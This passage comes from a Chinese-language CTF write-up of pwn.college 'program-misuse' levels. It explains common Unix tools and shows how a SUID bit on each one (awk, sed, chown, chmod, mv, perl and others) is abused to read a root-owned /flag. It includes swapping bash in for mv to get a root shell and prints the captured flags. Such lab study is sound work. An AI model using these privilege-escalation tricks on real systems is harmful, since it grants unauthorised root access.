可以用于将文件从一个地方传输到另一个地方，包括通过网络传输文件。例如，将文件从本地传输到远程主机：</p><pre class="line-numbers language-none"><code class="language-none">socat FILE:&#x2F;path&#x2F;to&#x2F;local&#x2F;file TCP:remote_host:port<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会将本地文件传输到远程主机的指定端口上。</p></li><li><p><strong>加密通信</strong>：<code>socat</code> 可以和 <code>openssl</code> 结合使用，实现加密的网络通信。例如，使用 TLS 连接：</p><pre class="line-numbers language-none"><code class="language-none">socat openssl-connect:remote_host:port,verify&#x3D;0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会在本地和远程主机之间建立一个使用 TLS 加密的连接。</p></li><li><p><strong>串口通信</strong>：<code>socat</code> 可以用于在串口之间传输数据，例如 RS232、RS485 等。例如，将数据从一个串口传输到另一个串口：</p><pre class="line-numbers language-none"><code class="language-none">socat &#x2F;dev&#x2F;ttyS0,raw,echo&#x3D;0 &#x2F;dev&#x2F;ttyS1,raw,echo&#x3D;0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会将 <code>/dev/ttyS0</code> 的数据传输到 <code>/dev/ttyS1</code>。</p></li><li><p><strong>端口转发</strong>：<code>socat</code> 可以用于端口转发，将一个端口上收到的数据转发到另一个端口。例如，将本地的 8080 端口上收到的数据转发到远程主机的 80 端口上：</p><pre class="line-numbers language-none"><code class="language-none">socat TCP-LISTEN:8080,fork TCP:remote_host:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会将本地 8080 端口的数据转发到远程主机的 80 端口上。</p></li></ol><p><code>socat -u &quot;file:/flag&quot; STDOUT</code></p><h3 id="level33whiptail"><a class="markdownIt-Anchor" href="#level33whiptail"></a> level33(whiptail)</h3><p><code>whiptail</code> 是一个在终端中显示对话框的命令行工具，常用于脚本中创建用户友好的交互界面。它可以用于显示各种类型的对话框，包括消息框、输入框、选择框等，以便与用户进行交互。</p><p>以下是 <code>whiptail</code> 的基本用法：</p><pre class="line-numbers language-none"><code class="language-none">whiptail [options] &lt;args&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中 <code>[options]</code> 是一些选项，<code>&lt;args&gt;</code> 是用于指定对话框类型和内容的参数。</p><p>以下是一些常用的 <code>whiptail</code> 对话框类型和示例用法：</p><ol><li><p><strong>消息框</strong>：</p><pre class="line-numbers language-none"><code class="language-none">whiptail --msgbox &quot;This is a message&quot; 10 40<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会在终端中显示一个消息框，显示文本 “This is a message”，框的大小为 10 行 40 列。</p></li><li><p><strong>输入框</strong>：</p><pre class="line-numbers language-none"><code class="language-none">whiptail --inputbox &quot;Enter your name:&quot; 10 40<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会在终端中显示一个输入框，提示用户输入名称。</p></li><li><p><strong>选择框</strong>：</p><pre class="line-numbers language-none"><code class="language-none">whiptail --menu &quot;Choose an option:&quot; 15 40 4 \&quot;1&quot; &quot;Option 1&quot; \&quot;2&quot; &quot;Option 2&quot; \&quot;3&quot; &quot;Option 3&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这会在终端中显示一个选择框，供用户从几个选项中选择。</p></li><li><p><strong>Yes/No 对话框</strong>：</p><pre class="line-numbers language-none"><code class="language-none">whiptail --yesno &quot;Do you want to continue?&quot; 10 40<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会在终端中显示一个 Yes/No 对话框，询问用户是否要继续操作。</p></li></ol><p>通过查阅<code>man</code>文档可以找到一个显示文件内容的命令</p><p><code>whiptail --textbox /flag 10 20</code></p><ul><li><code>whiptail</code> 是用于创建对话框的命令。</li><li><code>--textbox</code> 表示创建一个文本框对话框，用于显示文件内容。</li><li><code>/flag</code> 是指定的文件路径，即要显示内容的文件。</li><li><code>10</code> 是指定对话框的高度，表示文本框在垂直方向上可以显示的行数。</li><li><code>20</code> 是指定对话框的宽度，表示文本框在水平方向上可以显示的字符数。</li></ul><h3 id="level34awk"><a class="markdownIt-Anchor" href="#level34awk"></a> level34(awk)</h3><p><code>awk</code> 是一种强大的文本处理工具，通常用于对结构化文本数据进行处理、分析和转换。它以逐行方式扫描输入文件，并根据指定的模式和动作对数据进行处理。以下是 <code>awk</code> 常见用法和参数的概述：</p><h4 id="基本语法"><a class="markdownIt-Anchor" href="#基本语法"></a> 基本语法</h4><pre class="line-numbers language-none"><code class="language-none">awk [options] &#39;pattern &#123;action&#125;&#39; file<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>options</code>：<code>awk</code> 的选项，用于指定一些控制行为，例如字段分隔符、处理文件开始和结束等。</li><li><code>pattern</code>：模式，用于匹配输入数据的行。</li><li><code>&#123;action&#125;</code>：动作，用于对匹配的行执行操作。</li><li><code>file</code>：要处理的文件名。</li></ul><h4 id="常见选项"><a class="markdownIt-Anchor" href="#常见选项"></a> 常见选项</h4><ul><li><code>-F &lt;separator&gt;</code>：指定字段分隔符。默认情况下，字段分隔符为空格或制表符。</li><li><code>-f &lt;file&gt;</code>：从指定的文件中读取 <code>awk</code> 脚本。</li><li><code>-v &lt;var=value&gt;</code>：设置 <code>awk</code> 变量的值。</li><li><code>-W &lt;compat|posix&gt;</code>：设置兼容性模式。</li><li><code>-F,</code>：指定逗号为字段分隔符。</li><li><code>-v</code>：定义变量，例如 <code>-v var=value</code>。</li></ul><p>在 <code>awk</code> 中，动作指令是在模式匹配成功后执行的操作。它可以是一个简单的动作，也可以是一个复杂的动作块，用花括号 <code>&#123;&#125;</code> 括起来。</p><p>以下是一些常见的 <code>awk</code> 动作指令：</p><ol><li><p><strong>print</strong>：打印当前行或指定字段的内容。</p><pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123; print &#125;&#39; file.txtawk &#39;&#123; print $1, $2 &#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>assignment</strong>：赋值操作，将一个值赋给变量。</p><pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123; x &#x3D; $1 + $2; print x &#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>if-else</strong>：条件语句，根据条件执行不同的操作。</p><pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123; if ($1 &gt; 10) print &quot;Greater&quot;; else print &quot;Smaller&quot; &#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>for</strong>：循环语句，对一组值进行迭代处理。</p><pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123; for (i &#x3D; 1; i &lt;&#x3D; NF; i++) print $i &#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>while</strong>：循环语句，根据条件重复执行操作。</p><pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123; i &#x3D; 1; while (i &lt;&#x3D; NF) &#123; print $i; i++ &#125; &#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>split</strong>：将字符串拆分为数组。</p><pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123; split($0, arr, &quot;,&quot;); print arr[1] &#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>delete</strong>：删除数组中的元素。</p><pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123; delete arr[$1] &#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>next</strong>：跳过当前行，继续处理下一行。</p><pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123; if ($1 &#x3D;&#x3D; &quot;skip&quot;) next; print &#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>exit</strong>：立即终止 <code>awk</code> 的执行。</p><pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123; if ($1 &#x3D;&#x3D; &quot;stop&quot;) exit; print &#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p>这些是 <code>awk</code> 中常见的动作指令，可以根据具体的需求编写复杂的 <code>awk</code> 脚本来处理文本数据。</p><h4 id="常见用法示例"><a class="markdownIt-Anchor" href="#常见用法示例"></a> 常见用法示例</h4><ol><li><h5 id="打印指定列"><a class="markdownIt-Anchor" href="#打印指定列"></a> <strong>打印指定列</strong>：</h5><pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123;print $1, $3&#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><h5 id="根据条件筛选行"><a class="markdownIt-Anchor" href="#根据条件筛选行"></a> <strong>根据条件筛选行</strong>：</h5><pre class="line-numbers language-none"><code class="language-none">awk &#39;$3 &gt; 50&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><h5 id="统计行数"><a class="markdownIt-Anchor" href="#统计行数"></a> <strong>统计行数</strong>：</h5><pre class="line-numbers language-none"><code class="language-none">awk &#39;END &#123;print NR&#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><h5 id="计算列的总和"><a class="markdownIt-Anchor" href="#计算列的总和"></a> <strong>计算列的总和</strong>：</h5><pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123;sum +&#x3D; $1&#125; END &#123;print sum&#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><h5 id="指定字段分隔符"><a class="markdownIt-Anchor" href="#指定字段分隔符"></a> <strong>指定字段分隔符</strong>：</h5><pre class="line-numbers language-none"><code class="language-none">awk -F, &#39;&#123;print $1&#125;&#39; file.csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><h5 id="使用-awk-脚本文件"><a class="markdownIt-Anchor" href="#使用-awk-脚本文件"></a> <strong>使用 <code>awk</code> 脚本文件</strong>：</h5><pre class="line-numbers language-none"><code class="language-none">awk -f script.awk file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><h5 id="定义变量"><a class="markdownIt-Anchor" href="#定义变量"></a> <strong>定义变量</strong>：</h5><pre class="line-numbers language-none"><code class="language-none">awk -v var&#x3D;10 &#39;&#123;print $1, var&#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">awk</span> <span class="token string">'&#123; print &#125;'</span> /flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="level35sed"><a class="markdownIt-Anchor" href="#level35sed"></a> level35(sed)</h3><p><code>sed</code> 是一个流编辑器，主要用于对文本进行编辑、转换和过滤。它可以读取文本文件，逐行处理文本，并根据指定的编辑命令对文本进行修改。以下是一些常用的 <code>sed</code> 指令：</p><ol><li><p><strong>替换文本</strong>：<code>s/old/new/</code>，将每一行中的 <code>old</code> 替换为 <code>new</code>。</p><pre class="line-numbers language-none"><code class="language-none">sed &#39;s&#x2F;old&#x2F;new&#x2F;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>全局替换</strong>：<code>s/old/new/g</code>，将每一行中的所有 <code>old</code> 替换为 <code>new</code>。</p><pre class="line-numbers language-none"><code class="language-none">sed &#39;s&#x2F;old&#x2F;new&#x2F;g&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>行删除</strong>：<code>d</code>，删除匹配的行。</p><pre class="line-numbers language-none"><code class="language-none">sed &#39;&#x2F;pattern&#x2F;d&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>行打印</strong>：<code>p</code>，打印匹配的行。</p><pre class="line-numbers language-none"><code class="language-none">sed -n &#39;&#x2F;pattern&#x2F;p&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>行追加</strong>：<code>a</code>，在匹配行后添加新行。</p><pre class="line-numbers language-none"><code class="language-none">sed &#39;&#x2F;pattern&#x2F;a new line&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>行插入</strong>：<code>i</code>，在匹配行前插入新行。</p><pre class="line-numbers language-none"><code class="language-none">sed &#39;&#x2F;pattern&#x2F;i new line&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>行替换</strong>：<code>c</code>，将匹配行替换为新文本。</p><pre class="line-numbers language-none"><code class="language-none">sed &#39;&#x2F;pattern&#x2F;c new line&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>打印行号</strong>：<code>=</code></p><pre class="line-numbers language-none"><code class="language-none">sed &#39;&#x3D;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>删除空行</strong>：<code>/^$/d</code>，删除空白行。</p><pre class="line-numbers language-none"><code class="language-none">sed &#39;&#x2F;^$&#x2F;d&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>正则表达式</strong>：支持正则表达式进行模式匹配和替换。</p></li></ol><p>这些是 <code>sed</code> 中常用的一些指令，可以根据具体的需求和文本数据编写复杂的 <code>sed</code> 脚本来处理文本。</p><p><code>sed -n 'p' /flag </code></p><h3 id="level36ed"><a class="markdownIt-Anchor" href="#level36ed"></a> level36(ed)</h3><p><code>ed</code> 是一个文本编辑器，可以在终端中以行为单位对文本文件进行编辑。虽然 <code>ed</code> 的使用方式相对较复杂，但它是 Unix 系统中最早的编辑器之一，对于在纯文本终端环境下进行编辑操作非常有用。以下是一些常用的 <code>ed</code> 指令和用法：</p><ol><li><p><strong>打开文件</strong>：打开一个文件进行编辑。</p><pre class="line-numbers language-none"><code class="language-none">ed filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>插入文本</strong>：在指定行之后插入文本。</p><pre class="line-numbers language-none"><code class="language-none">atext to insert.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>添加文本</strong>：在文件末尾添加文本。</p><pre class="line-numbers language-none"><code class="language-none">atext to append.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>替换文本</strong>：用新文本替换指定行的文本。</p><pre class="line-numbers language-none"><code class="language-none">s&#x2F;old&#x2F;new&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>删除行</strong>：删除指定行。</p><pre class="line-numbers language-none"><code class="language-none">d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>显示行</strong>：显示指定行的内容。</p><pre class="line-numbers language-none"><code class="language-none">p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>移动光标</strong>：将光标移动到指定行。</p><pre class="line-numbers language-none"><code class="language-none">n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>保存退出</strong>：保存修改并退出编辑器。</p><pre class="line-numbers language-none"><code class="language-none">wq<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>退出不保存</strong>：放弃修改并退出编辑器。</p><pre class="line-numbers language-none"><code class="language-none">q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>显示行号</strong>：显示当前行号。</p><pre class="line-numbers language-none"><code class="language-none">&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>插入命令</strong>：在当前行之前插入一行命令。</p><pre class="line-numbers language-none"><code class="language-none">icommand.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>执行命令</strong>：执行当前行的命令。</p><pre class="line-numbers language-none"><code class="language-none">!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p>这种不常用</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level36:/challenge$ ed /flag<span class="token number">57</span>ppwn.college<span class="token punctuation">&#123;</span>oSLjpurQyv2NRFJmvTLXN49oRUm.0FO3EDLzczN0UzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level37chown"><a class="markdownIt-Anchor" href="#level37chown"></a> level37(chown)</h3><p><code>chown</code> 是一个用于更改文件或目录的所有者的命令，它可以修改文件或目录的所有者和所属用户组。以下是一些 <code>chown</code> 命令的常用用法：</p><ol><li><p><strong>更改文件所有者</strong>：将文件的所有者更改为指定的用户。</p><pre class="line-numbers language-none"><code class="language-none">chown username filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>更改文件所有者和所属组</strong>：将文件的所有者和所属组同时更改为指定的用户和组。</p><pre class="line-numbers language-none"><code class="language-none">chown username:groupname filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>更改目录及其子目录的所有者</strong>：使用 <code>-R</code> 选项可以递归更改目录及其子目录中所有文件的所有者。</p><pre class="line-numbers language-none"><code class="language-none">chown -R username directory<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>使用 UID 和 GID 更改所有者</strong>：可以使用用户的 UID 和组的 GID 来指定所有者和组，而不是用户名和组名。</p><pre class="line-numbers language-none"><code class="language-none">chown uid:gid filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>仅更改文件的所属组</strong>：如果省略了所有者部分，则只更改文件的所属组。</p><pre class="line-numbers language-none"><code class="language-none">chown :groupname filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>仅更改目录的所有者，但不更改子目录和文件的所有者</strong>：对于目录，可以使用 <code>--reference</code> 选项，将一个目录的所有者和组信息作为参考，并应用到另一个目录。</p><pre class="line-numbers language-none"><code class="language-none">chown --reference&#x3D;reference_file directory<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>仅更改文件的权限而不更改所有者</strong>：可以使用 <code>-v</code> 选项显示详细信息，包括每个文件的更改。</p><pre class="line-numbers language-none"><code class="language-none">chown -v username filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>更改符号链接的所有者</strong>：默认情况下，<code>chown</code> 不会更改符号链接的所有者，但可以使用 <code>-h</code> 选项来更改符号链接本身的所有者。</p><pre class="line-numbers language-none"><code class="language-none">chown -h username symlink<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p>这些是 <code>chown</code> 命令的一些常用用法，可以根据具体的需求选择合适的选项和参数。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level37:/challenge$ <span class="token function">chown</span> <span class="token parameter variable">-c</span> hacker /flagchanged ownership of <span class="token string">'/flag'</span> from root to hackerhacker@program-misuse~level37:/challenge$ <span class="token function">cat</span> /flagpwn.college<span class="token punctuation">&#123;</span>8LnNaiS1CrzNHDD3_gzCrvxUFgY.0VO3EDLzczN0UzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level38chmod"><a class="markdownIt-Anchor" href="#level38chmod"></a> level38(chmod)</h3><p><code>chmod</code> 是用于更改文件或目录权限的命令。它可以通过指定权限模式来修改文件的读、写、执行权限，也可以通过符号或数字形式来设置权限。以下是一些常用的 <code>chmod</code> 命令和选项：</p><ol><li><p><strong>基本语法</strong>：</p><pre class="line-numbers language-none"><code class="language-none">chmod [options] mode file(s)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>设置权限</strong>：通过数字形式设置权限。</p><pre class="line-numbers language-none"><code class="language-none">chmod 755 file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>符号形式设置权限</strong>：</p><ul><li><code>u</code>：文件所有者</li><li><code>g</code>：文件所属组</li><li><code>o</code>：其他用户</li><li><code>a</code>：所有用户</li></ul><pre class="line-numbers language-none"><code class="language-none">chmod u+x file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>递归设置权限</strong>：通过 <code>-R</code> 选项递归地更改目录及其子目录的权限。</p><pre class="line-numbers language-none"><code class="language-none">chmod -R 755 directory<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>赋予所有权限</strong>：</p><pre class="line-numbers language-none"><code class="language-none">chmod 777 file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>取消特定权限</strong>：</p><pre class="line-numbers language-none"><code class="language-none">chmod a-x file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>使文件可执行</strong>：</p><pre class="line-numbers language-none"><code class="language-none">chmod +x script.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>设置特殊权限</strong>：</p><ul><li><code>setuid</code>（SUID）：将文件的执行权限设置为所有者的权限。</li><li><code>setgid</code>（SGID）：将文件的执行权限设置为组的权限。</li><li><code>sticky</code>：设置目录的粘滞位，防止其他用户删除非自己的文件。</li></ul><pre class="line-numbers language-none"><code class="language-none">chmod u+s file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>数字形式设置权限</strong>：</p><ul><li><code>4</code>：读权限</li><li><code>2</code>：写权限</li><li><code>1</code>：执行权限</li></ul><pre class="line-numbers language-none"><code class="language-none">chmod 644 file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>显示详细信息</strong>：通过 <code>-v</code> 选项显示操作的详细信息。</p><pre class="line-numbers language-none"><code class="language-none">chmod -v 755 file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>使用绝对路径设置权限</strong>：</p><pre class="line-numbers language-none"><code class="language-none">chmod &#x2F;path&#x2F;to&#x2F;file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">IMPORTANT: <span class="token function">make</span> sure to run me <span class="token punctuation">(</span>./babysuid_level38<span class="token punctuation">)</span> every <span class="token function">time</span> that you restartthis challenge container to <span class="token function">make</span> sure that I <span class="token builtin class-name">set</span> the SUID bit on /usr/bin/chmod<span class="token operator">!</span>hacker@program-misuse~level38:/challenge$ <span class="token function">chmod</span> <span class="token number">777</span> /flaghacker@program-misuse~level38:/challenge$ <span class="token function">cat</span> /flag pwn.college<span class="token punctuation">&#123;</span>QI1o6TWY0HyOp6UWUMrgD7oKFaf.0FM4EDLzczN0UzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level39cp"><a class="markdownIt-Anchor" href="#level39cp"></a> level39(cp)</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level39:/challenge$ <span class="token function">touch</span> myflagtouch: cannot <span class="token function">touch</span> <span class="token string">'myflag'</span><span class="token builtin class-name">:</span> Permission deniedhacker@program-misuse~level39:/challenge$ <span class="token function">touch</span> myflag.txttouch: cannot <span class="token function">touch</span> <span class="token string">'myflag.txt'</span><span class="token builtin class-name">:</span> Permission deniedhacker@program-misuse~level39:/challenge$ <span class="token builtin class-name">cd</span> ~hacker@program-misuse~level39:~$ <span class="token function">ls</span>Desktop  leap  myflaghacker@program-misuse~level39:~$ <span class="token function">cp</span> /flag ~/myflaghacker@program-misuse~level39:~$ <span class="token function">cat</span> myflag pwn.college<span class="token punctuation">&#123;</span>Qk-mBYdB47xVyCjxSB0xC1SUaIZ.0VM4EDLzczN0UzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者说可以这样写</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /flag /dev/stdout<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="level40mv"><a class="markdownIt-Anchor" href="#level40mv"></a> level40(mv)</h3><p>使用 <code> </code>mv<code> </code> 命令无法在不改变文件属性的情况下移动文件</p><p>想了半小时想不出如何绕过</p><ul><li>思路1</li></ul><p>看了github一位老哥的写法；很神奇</p><p>就是将先将 <code>flag</code>文件移动到 当前用户目录下,虽然文件属性没有发生改变，但是平台可以保留这个目录文件到其他关卡，那么我们之间到cat有suid下的关卡就可以直接读了</p><ul><li><p>思路2</p><p>通过移动将 mv的二进制文件替换为bash的二进制文件，然后运行判题程序，那么bash就有的suid权限，那么我们就有了root权限</p><p>从而提权成功</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level40:/challenge$ ./babysuid_level40 <span class="token operator">&amp;&amp;</span><span class="token function">mv</span> /usr/bin/bash /usr/bin/mv<span class="token operator">&amp;&amp;</span> ./babysuid_level40 <span class="token operator">&amp;&amp;</span><span class="token function">mv</span> <span class="token parameter variable">-p</span>Welcome to ./babysuid_level40<span class="token operator">!</span>This challenge is part of a series of programs that<span class="token builtin class-name">let</span> you get the flag by doing tricks with permissions.I just <span class="token builtin class-name">set</span> the SUID bit on /usr/bin/mv.Try to use it to <span class="token builtin class-name">read</span> the flag<span class="token operator">!</span>IMPORTANT: <span class="token function">make</span> sure to run me <span class="token punctuation">(</span>./babysuid_level40<span class="token punctuation">)</span> every <span class="token function">time</span> that you restartthis challenge container to <span class="token function">make</span> sure that I <span class="token builtin class-name">set</span> the SUID bit on /usr/bin/mv<span class="token operator">!</span>Welcome to ./babysuid_level40<span class="token operator">!</span>This challenge is part of a series of programs that<span class="token builtin class-name">let</span> you get the flag by doing tricks with permissions.I just <span class="token builtin class-name">set</span> the SUID bit on /usr/bin/mv.Try to use it to <span class="token builtin class-name">read</span> the flag<span class="token operator">!</span>IMPORTANT: <span class="token function">make</span> sure to run me <span class="token punctuation">(</span>./babysuid_level40<span class="token punctuation">)</span> every <span class="token function">time</span> that you restartthis challenge container to <span class="token function">make</span> sure that I <span class="token builtin class-name">set</span> the SUID bit on /usr/bin/mv<span class="token operator">!</span>mv-5.0<span class="token comment"># cat /flag</span>pwn.college<span class="token punctuation">&#123;</span>wni-KDP3s-n97BB2eWOTe5wUl5i.0lM4EDLzczN0UzW<span class="token punctuation">&#125;</span>mv-5.0<span class="token comment"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level41perl"><a class="markdownIt-Anchor" href="#level41perl"></a> level41(perl)</h3><p><code>Perl</code> is a high-level, versatile programming language know for its powerful text processing capabilities. It was created by <code>Lary Wall</code> in the late <code>1980s</code>.</p><p>我们需要用perl语言来读取<code>/flag</code></p><p>拷问gpt</p><pre class="line-numbers language-perl" data-language="perl"><code class="language-perl"><span class="token comment">#!/usr/bin/perl</span><span class="token keyword">use</span> strict<span class="token punctuation">;</span><span class="token keyword">use</span> warnings<span class="token punctuation">;</span><span class="token comment"># 打开文件</span>open<span class="token punctuation">(</span><span class="token keyword">my</span> <span class="token variable">$fh</span><span class="token punctuation">,</span> <span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'/flag'</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token keyword">die</span> <span class="token string">"无法打开文件 '/flag' $!"</span><span class="token punctuation">;</span><span class="token comment"># 读取文件内容并打印到标准输出</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token keyword">my</span> <span class="token variable">$line</span> <span class="token operator">=</span> <span class="token operator">&lt;</span><span class="token variable">$fh</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">print</span> <span class="token variable">$line</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment"># 关闭文件</span>close<span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level41:~/demo$ <span class="token function">vim</span> perl.plhacker@program-misuse~level41:~/demo$ perl perl.pl pwn.college<span class="token punctuation">&#123;</span>E3xT7qLwd2jI9Ev6oHUdWFb4v-Z.01M4EDLzczN0UzW<span class="token punctuation">&#125;</span>hacker@program-misuse~level41:~/demo$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level42python"><a class="markdownIt-Anchor" href="#level42python"></a> level42(python)</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level42:/challenge$ <span class="token builtin class-name">cd</span> ~/demo/hacker@program-misuse~level42:~/demo$ <span class="token function">vim</span> program_misuse_level42.pyhacker@program-misuse~level42:~/demo$ python program_misuse_level42.py pwn.college<span class="token punctuation">&#123;</span>InEQ92_mJH6ItEQoBai78E2l2Mj.0FN4EDLzczN0UzW<span class="token punctuation">&#125;</span><span aria-hidden="true" 